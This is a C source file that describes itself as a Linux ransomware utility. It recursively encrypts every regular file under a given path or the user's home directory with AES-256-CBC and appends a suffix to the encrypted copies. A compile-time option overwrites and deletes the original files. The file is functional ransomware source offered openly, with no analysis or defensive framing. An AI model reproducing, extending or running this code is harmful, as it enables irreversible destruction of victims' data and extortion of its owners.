/* See LICENSE file for license details */
/* mindln - x86_64 linux ransomware utility with false-login */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <getopt.h>
#include <sys/stat.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

#include "config.h"

#define version "0.1"

int p_fs = 0;

void progress(int cn){
	int width = 30;
	int pos = cn % (width + 1);
	printf("\rencrypting: [");
	for(int i = 0; i < width; i++){
		if(i < pos) printf("#");
		else printf(" ");
	}

	printf("] %d file(s)", cn);
	fflush(stdout);
}

void derive_key(const char *passwd, unsigned char *key){
	PKCS5_PBKDF2_HMAC(passwd, strlen(passwd), (unsigned char *)"saltsalt", 8, pbkdf2_iteration, EVP_sha256(), aes_key_size, key);
}

void encrypt(const char *path, const unsigned char *key){
	unsigned char iv[aes_iv_size], salt[salt_size];
	RAND_bytes(iv, aes_iv_size);
	RAND_bytes(salt, salt_size);
	EVP_CIPHER_CTX *c = EVP_CIPHER_CTX_new();
	if(!c) return;
	if(!EVP_EncryptInit_ex(c, EVP_aes_256_cbc(), NULL, key, iv)){
		EVP_CIPHER_CTX_free(c);
		return;
	}

	char last_path[1024];
	snprintf(last_path, sizeof(last_path), "%s" file_suffix, path);
	FILE *in = fopen(path, "rb");
	FILE *out = fopen(last_path, "wb");
	if(!in || !out){
		if(in) fclose(in);
		if(out) fclose(out);
		EVP_CIPHER_CTX_free(c);
		return;
	}

	fwrite(salt, 1, salt_size, out);
	fwrite(iv, 1, aes_iv_size, out);

	unsigned char inbuf[4096], outbuf[4096 + EVP_MAX_BLOCK_LENGTH];
	int bytes_read, out_ln;
	while((bytes_read = fread(inbuf, 1, 4096, in)) > 0){
		if(!EVP_EncryptUpdate(c, outbuf, &out_ln, inbuf, bytes_read)) break;
		fwrite(outbuf, 1, out_ln, out);
	}

	if(EVP_EncryptFinal_ex(c, outbuf, &out_ln)){
		fwrite(outbuf, 1, out_ln, out);
	}

	EVP_CIPHER_CTX_free(c);

	fclose(in);
	fclose(out);

	#if wipe_fs
	for(int i = 0; i < 3; i++){
		FILE *f = fopen(path, "wb");
		if(f){
			char wipe_buf[4096] = {0};
			fwrite(wipe_buf, 1, sizeof(wipe_buf), f);
			fclose(f);
		}
	}

	remove(path);
	#endif

	p_fs++;
	progress(p_fs);
}

void p_directory(const char *dp, const unsigned char *key){
	DIR *dr = opendir(dp);
	if(!dr) return;
	struct dirent *e;
	while((e = readdir(dr))){
		if(!strcmp(e->d_name, ".") || !strcmp(e->d_name, "..")) continue;
		char path[2048];
		snprintf(path, sizeof(path), "%s/%s", dp, e->d_name);
		struct stat s;
		if(stat(path, &s) != 0) continue;
		if(S_ISDIR(s.st_mode)){
			p_directory(path, key);
		} else if(S_ISREG(s.st_mode)){
			encrypt(path, key);
		}
	}

	closedir(dr);
}

void show_version(){
	printf("encryptor-%s\n", version);
}

void help(){
	printf("usage: encryptor [options]..\n");
	printf("options:\n");
	printf("  -f	encrypt a file\n");
	printf("  -p	encrypt all files in given path\n");
	printf("  -k	custom encryption passwd\n");
	printf("  -u	encrypt user home directory\n");
	printf("  -v	show version information\n");
	printf("  -h	display this\n");
}

int main(int argc, char *argv[]){
	char *target = NULL;
	char *passwd = last_passwd;
	char *a_file = NULL;
	int opt, user_home = 0;
	while((opt = getopt(argc, argv, "p:f:k:uvh")) != -1){
		switch(opt){
			case 'p': target = optarg; break;
			case 'f': a_file = optarg; break;
			case 'k': passwd = optarg; break;
			case 'u': user_home = 1; break;
			case 'v': show_version(); return 0;
			case 'h': help(); return 0;
			default: help(); return 1;
		}
	}

	if(user_home){
		char *home = getenv("HOME");
		if(home) target = home;
	}

	unsigned char key[aes_key_size];
	derive_key(passwd, key);
	if(a_file){
		struct stat s;
		if(stat(a_file, &s) != 0 || !S_ISREG(s.st_mode)){
			fprintf(stderr, "'%s' is not a valid file\n", a_file);
			return 1;
		}

		printf("encrypting file: %s\n", a_file);
		encrypt(a_file, key);
		printf("\nencrypted\n");
	} else if(target){
		struct stat s;
		if(stat(target, &s) != 0 || !S_ISDIR(s.st_mode)){
			fprintf(stderr, "'%s' is not a valid directory\n", target);
			return 1;
		}

		printf("encrypting directory: %s\n", target);
		p_directory(target, key);
		printf("\nencryption completed\n");
	} else {
		help();
		return 1;
	}

	return 0;
}
